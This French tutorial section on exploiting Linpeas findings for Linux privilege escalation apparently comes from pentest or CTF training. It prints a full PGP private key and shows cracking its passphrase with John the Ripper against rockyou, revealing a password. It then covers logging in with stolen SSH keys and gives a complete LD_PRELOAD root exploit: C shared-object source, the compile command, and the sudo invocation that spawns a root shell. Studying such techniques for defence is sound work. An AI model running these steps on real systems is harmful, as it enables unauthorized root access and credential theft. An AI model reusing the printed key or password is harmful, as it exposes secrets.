# 2. Exploiter les données de Linpeas

Nous verrons comment exploiter les données de Linpeas au travers d'exemples.

## Récupérer une clé PGP

Parfois, certaines clé pgp, utile pour se connecter a un ftp sans mot de passe, est possible d'accès par un utilisateur possédant des droits inférieurs.

```console
> cat key
-----BEGIN PGP PRIVATE KEY BLOCK-----

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
=7Uo6
-----END PGP PRIVATE KEY BLOCK-----
```

Nous pouvons maintenant utiliser `JohnTheRipper` pour cracker le mot de passe.
Avant d'utiliser John, nous devons convertir la clé dans un format crackable par `JohnTheRipper`.

```bash
gpg2john key > gpg.john
```

Nous allons utiliser un liste de mot de passe pour cracker ce mot de passe.

```console
$ john -w=/usr/share/wordlists/rockyou.txt gpg.john
[...]
blink182         (user)
[...]
```

Nous avons donc maintenant le mot de passe de ce compte et pouvons donc se connecter en ssh.

## Récupérer une clé privée openssh

Une clé privée openssh est tout simplement un mot de passe en quelque sorte. L'avoir signifie donc que l'on a accès au compte qui utilise cette clé. 
Pour l'utiliser il suffit d'utiliser cette commande:

```bash
ssh -i cleprivee.file username@x.x.x.x
```

Si la console indique un problème de permissions, exécutez la commande suivante:

```bash
chmod 600 cleprivee.file
```

## usurpation de privilege 

```bash
sudo -u user fichier
```

Cette commande nous permet d'usurper les privilège d'un compte avec des droits supérieurs.

## Variable d'environment `LD_Preload`

Les bibliothèques partagées sont des bibliothèques qui sont chargées par les programmes lorsqu'ils démarrent. Lorsqu'une bibliothèque partagée est installée correctement, tous les programmes qui démarrent par la suite utilisent automatiquement la nouvelle bibliothèque partagée.

Chaque bibliothèque partagée a un nom spécial appelé "soname". Le soname est composé du préfixe "lib", du nom de la bibliothèque, de `".so"`, suivie d'un point et d'un numéro de version.

Les programmes ld.so et ld-linux.so* recherchent et chargent les objets partagés (bibliothèques partagées) nécessaires à un programme, préparent le programme à s'exécuter, puis l'exécutent.

LD_Preload : Il s'agit d'une variable d'environnement qui répertorie les bibliothèques partagées dont les fonctions remplacent l'ensemble standard, tout comme le fait /etc/ld.so.preload. Ces fonctions sont implémentées par le chargeur /lib/ld-linux.so

Il est important que l'utilisateur connecté ait des droits sudo, c'est pourquoi nous avons donné des droits sudo au programme `/usr/bin/find` qui sera exécuté par l'utilisateur sudo. Mais en dehors de cela, il existe une spécification par défaut où vous pouvez définir une variable d'environnement pour fonctionner comme sudo.

Pour ce faire, suivez les étapes ci-dessous :

- Ouvrez le fichier /etc/sudoers en tapant visudo

- Maintenant, donnez des droits sudo à un utilisateur, dans notre cas "user" sera membre de sudoers.

```bash
user ALL=(ALL:ALL) NOPASSWD : /usr/bin/find
```

- Ajoutez ensuite ce qui suit comme spécification par défaut pour définir l'environnement de LD_preload.

```bash
Defaults env_keep += LD_PRELOAD
```

Tapez la commande sudo -l pour détecter si cette vulnérabilité est présente.

Créons un fichier C dans le répertoire /tmp.

```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD") ;
    setgid(0) ;
    setuid(0) ;
    system("/bin/sh") ;
}
```

Sauvegardez-le ensuite sous le nom de shell.c dans /tmp.

Compilons-le pour générer un objet partagé avec l'extension .so, tout comme le fichier .dll dans le système d'exploitation Windows, et tapons donc ce qui suit :

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

```console
$ ls -al shell.so
-rwxrwxr-x 1 user user 6416 Jun 13 22:50 shell.so
$ sudo LD_PRELOAD=/tmp/shell.so find
# id
# whoami
```

Nous avons obtenu l'accès ROOT.
